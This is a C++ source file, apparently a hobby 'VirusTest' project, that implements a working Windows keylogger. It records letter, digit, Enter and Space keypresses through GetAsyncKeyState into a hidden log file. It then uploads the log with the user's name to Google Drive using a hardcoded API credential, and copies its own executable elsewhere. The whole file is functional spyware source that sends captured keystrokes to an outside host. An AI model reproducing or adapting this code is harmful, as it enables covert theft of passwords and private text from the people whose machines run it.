// VirusTest.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <thread>
#include <chrono>
#include <fstream>
#include <vector>
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include <Lmcons.h>
#include <ctime>
#include <CkAuthGoogle.h>
#include <CkRest.h>
#include <CkJsonObject.h>
#include <sstream>

std::string randomString(const int len) {

	std::string tmp_s;
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	srand((unsigned)time(NULL) * _getpid());

	for (int i = 0; i < len; ++i)
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];


	return tmp_s;
}

struct FileService {

	std::string filename = "c:\\Users\\shadi\\Desktop\\" + randomString(10) + ".v";

	static std::string getFileName() { return singleton->filename; }

	static FileService* singleton;
};

FileService* FileService::singleton = new FileService();

std::string fileToString(const std::string& filename) {
	std::ifstream inFile;
	inFile.open(filename); //open the input file

	std::stringstream strStream;
	strStream << inFile.rdbuf(); //read the file
	std::string str = strStream.str(); //str holds the content of the file

	return str; //you can do anything with the string!!!
}

std::string getUserName() {
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameA(username, &username_len);

	return std::string(username);
}

std::string getTimeAsString() {

	auto time = std::chrono::system_clock::now();

	std::time_t lastRecordedTime_t = std::chrono::system_clock::to_time_t(time);

	return std::ctime(&lastRecordedTime_t);
}

void uploadToDrive(const std::string& name, const std::string& content)
{
	bool success = true;

	//  It requires the Chilkat API to have been previously unlocked.
	//  See Global Unlock Sample for sample code.

	//  This example uses a previously obtained access token having permission for the
	//  Google Drive scope.

	CkAuthGoogle gAuth;
	gAuth.put_AccessToken("AIzaSyDnJzs_PR86P8qxPrKqnzo8cc0gthaMbbA");

	CkRest rest;

	//  Connect using TLS.
	bool bAutoReconnect = true;
	success = rest.Connect("www.googleapis.com", 443, true, bAutoReconnect);

	//  Provide the authentication credentials (i.e. the access token)
	rest.SetAuthGoogle(gAuth);

	//  A multipart upload to Google Drive needs a multipart/related Content-Type
	rest.AddHeader("Content-Type", "multipart/related");

	//  Specify each part of the request.

	//  The 1st part is JSON with information about the file.
	rest.put_PartSelector("1");
	rest.AddHeader("Content-Type", "application/json; charset=UTF-8");

	CkJsonObject json;
	json.AppendString("name", (name + getTimeAsString() + ".txt").c_str());
	json.AppendString("description", "Test");
	json.AppendString("mimeType", "text/plain");
	rest.SetMultipartBodyString(json.emit());

	//  The 2nd part is the file content.
	//  In this case, we'll upload a simple text file containing "Hello World!"
	rest.put_PartSelector("2");
	rest.AddHeader("Content-Type", "text/plain");

	const char* fileContents = content.c_str();
	rest.SetMultipartBodyString(fileContents);

	const char* jsonResponse = rest.fullRequestMultipart("POST", "/upload/drive/v3/files?uploadType=multipart");
	if (rest.get_LastMethodSuccess() != true) {
		std::cout << rest.lastErrorText() << "\r\n";
		return;
	}

	//  A successful response will have a status code equal to 200.
	if (rest.get_ResponseStatusCode() != 200) {
		std::cout << "response status code = " << rest.get_ResponseStatusCode() << "\r\n";
		std::cout << "response status text = " << rest.responseStatusText() << "\r\n";
		std::cout << "response header: " << rest.responseHeader() << "\r\n";
		std::cout << "response JSON: " << jsonResponse << "\r\n";
		return;
	}

	//  Show the JSON response.
	json.Load(jsonResponse);

	//  Show the full JSON response.
	json.put_EmitCompact(false);
	std::cout << json.emit() << "\r\n";

	//  A successful response looks like this:
	//  {
//   "kind": "drive#file",
	//    "id": "0B53Q6OSTWYoldmJ0Z3ZqT2x5MFk",
	//    "name": "Untitled",
	//    "mimeType": "text/plain"
	//  }

	//  Get the fileId:
	std::cout << "fileId: " << json.stringOf("id") << "\r\n";
}

void save_in_file(std::ostream& stream, char x)
{
	static uint32_t bufferSize = 0;
	
	if (x == VK_RETURN)
		stream << std::endl;
	else
		stream << (int)x << ' ';

	stream.flush();


	bufferSize += 4; //bytes;

	// If file is greater than 1 kilobyte, send data
	const unsigned int MAX_BUFFER_SIZE = 10; // 1024
	if (bufferSize >= MAX_BUFFER_SIZE) {
		// Send data
		auto data = fileToString(FileService::getFileName());
		uploadToDrive(getUserName(), data);
		
		bufferSize = 0;
	}
}

void recordTime(std::chrono::time_point<std::chrono::system_clock> time, std::ostream& stream) {
	
	std::time_t lastRecordedTime_t = std::chrono::system_clock::to_time_t(time);
	stream << "\n[" << std::ctime(&lastRecordedTime_t) << "]\n";
}

// CreateLink - Uses the Shell's IShellLink and IPersistFile interfaces 
//              to create and store a shortcut to the specified object. 
//
// Returns the result of calling the member functions of the interfaces. 
//
// Parameters:
// lpszPathObj  - Address of a buffer that contains the path of the object,
//                including the file name.
// lpszPathLink - Address of a buffer that contains the path where the 
//                Shell link is to be stored, including the file name.
// lpszDesc     - Address of a buffer that contains a description of the 
//                Shell link, stored in the Comment field of the link
//                properties.
HRESULT CreateLink(LPCWSTR lpszPathObj, LPCSTR lpszPathLink, LPCWSTR lpszDesc)
{
	HRESULT hres;
	IShellLink* psl;

	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called.
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;

		// Set the path to the shortcut target and add the description. 
		psl->SetPath(lpszPathObj);
		psl->SetDescription(lpszDesc);

		// Query IShellLink for the IPersistFile interface, used for saving the 
		// shortcut in persistent storage. 
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

		if (SUCCEEDED(hres))
		{
			WCHAR wsz[MAX_PATH];

			// Ensure that the string is Unicode. 
			MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);

			// Save the link by calling IPersistFile::Save. 
			hres = ppf->Save(wsz, TRUE);
			ppf->Release();
		}
		psl->Release();
	}
	return hres;
}

void copyProgram() {
	wchar_t filename[MAX_PATH];
	wchar_t newLocation[] = L"c:\\Users\\shadi\\Desktop\\";//put actual path here (i.e. don't use as is)
	
	BOOL stats = 0;
	DWORD size = GetModuleFileName(NULL, filename, MAX_PATH);
	if (size)
		CopyFile(filename, newLocation, stats);
	else
		printf("Could not find EXE file name.\n");
}

int main(int argc, const char* argv[])
{
	using namespace std::chrono_literals;

	
	
	copyProgram();
	

	std::ofstream myfile;
	myfile.open(FileService::getFileName() , std::ios_base::app);

	auto lastRecordedTime = std::chrono::system_clock::now();
	recordTime(lastRecordedTime, myfile);

	while (true)
	{
		// Record date and time
		auto now = std::chrono::system_clock::now();
		if (now - lastRecordedTime >= 10min) {
			recordTime(now, myfile);
			lastRecordedTime = now;
		}

		
		// Record letters
		for (int i = 'A'; i <= 'Z'; i++) {
			if (GetAsyncKeyState(i) & 0x0001)
			{
				save_in_file(myfile, (char)i);
			}
		}

		// Record numbers
		for (int i = '0'; i <= '9'; i++) {
			if (GetAsyncKeyState(i) & 0x0001)
			{
				save_in_file(myfile, (char)i);
			}
		}

		// Record enter
		if (GetAsyncKeyState(VK_RETURN) & 0x0001)
		{
			save_in_file(myfile, VK_RETURN);
		}

		// Record space
		if (GetAsyncKeyState(VK_SPACE) & 0x0001)
		{
			save_in_file(myfile, ' ');
		}

		
		std::this_thread::sleep_for(5ms);
	}

	myfile.close();
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
